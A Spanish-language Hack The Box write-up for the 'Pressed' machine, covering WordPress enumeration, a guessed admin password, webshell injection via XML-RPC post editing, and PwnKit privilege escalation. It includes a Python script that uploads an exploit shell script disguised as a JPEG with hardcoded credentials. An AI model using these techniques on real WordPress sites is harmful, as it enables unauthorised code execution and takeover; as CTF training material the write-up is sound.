---
layout: single
title: Pressed - Hack The Box
excerpt: "Hoy nos enfrentamos contra pressed, es una máquina de hackthebox de dificultad difícil que tiene expuesto un backup en lo cual extraemos una contraseña, retocamos un poco la contraseña para poder editar blogs en xmlrpc, luego logramos subir una webshell y subimos un archivo para poder convertirnos en root."
date: 2022-09-20
classes: wide
header:
  teaser: /assets/images/htb-writeup-pressed/pressed_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - cxdxnt
tags:  
  - password guessing
  - WordPress XML'RPC Create WebShell
  - PwnKit Exploit
---


## Enumeración

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-20 05:32 -03
Nmap scan report for pressed.htb (10.10.11.142)
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.9
|_http-title: UHC Jan Finals &#8211; New Month, New Boxes
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.76 seconds
```
Solo nos reporta el puerto 80 por lo cual le lanzamos un wpscan a ver que nos detecta.

![](/assets/images/htb-writeup-pressed/wpscan.png)

En dicho archivo nos encontramos una contraseña, uhc-jan-finals-2021 la modificamos a uhc-jan-finals-2022, y se nos presenta válida.Pero el panel de autenticación, tiene segundo factor de autenticación.

![](/assets/images/htb-writeup-pressed/otp.png)

## Rce

Por lo cual decido pasar a xmlrpc, que xmlrpc es una interfaz que actúa como api para aplicaciones web.En el xmlrpc podemos ver la flag del usuario, pero salteemos eso y vayamos al grano.Para comunicarnos con xmlrpc utilizaremos python.Primero pasaremos a conectarnos.

![](/assets/images/htb-writeup-pressed/connect.png)

Listamos el contenido del blog.

```php
'<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->

<?php  echo(file_get_contents('/var/www/html/output.log')); ?> ## La cadena decodificada en base64
```

Lo que haremos ahora es cambiar el contenido en base64 para poner el que queramos nosotros.

![](/assets/images/htb-writeup-pressed/cmd.png)

![](/assets/images/htb-writeup-pressed/post.png)

Tenemos ejecución de código.

![](/assets/images/htb-writeup-pressed/rce.png)

## Elevacion de privilegios 
La máquina posee una versión de pkexec vulnerable. Pero claro, si no tenemos acceso a la máquina, ¿cómo vamos a poder ejecutarlo?. La solución es fácil, nos descargamos el repositorio pkwner de kimusan que contiene una versión en bash para aprovechar dicha vulnerabilidad.Nos creamos un script en python3 para subir un archivo.


```python

from wordpress_xmlrpc import Client, WordPressPost
from wordpress_xmlrpc.compat import xmlrpc_client
from wordpress_xmlrpc.methods import media, posts
client = Client('http://pressed.htb/xmlrpc.php','admin','uhc-jan-finals-2022')
data = {
        'name': 'picture.jpg',
        'type': 'image/jpeg',  # mimetype
}

with open('pkwner.sh', 'rb') as img:
        data['bits'] = xmlrpc_client.Binary(img.read())

response = client.call(media.UploadFile(data))
print(response)
```
Una vez subido desde la webshell lo ejecutamos.

![](/assets/images/htb-writeup-pressed/flag.png)

Tenemos la flag.Pero eso no basta, hay que conseguir una shell. Para poder conectarnos remotamente a la máquina hay que configurar una rules en iptables, para que nos acepte tráfico saliente y entrante de nuestra ip, entonces hacemos lo siguiente.

![](/assets/images/htb-writeup-pressed/iptables.png)

Obtenemos una shell.

![](/assets/images/htb-writeup-pressed/root.png)
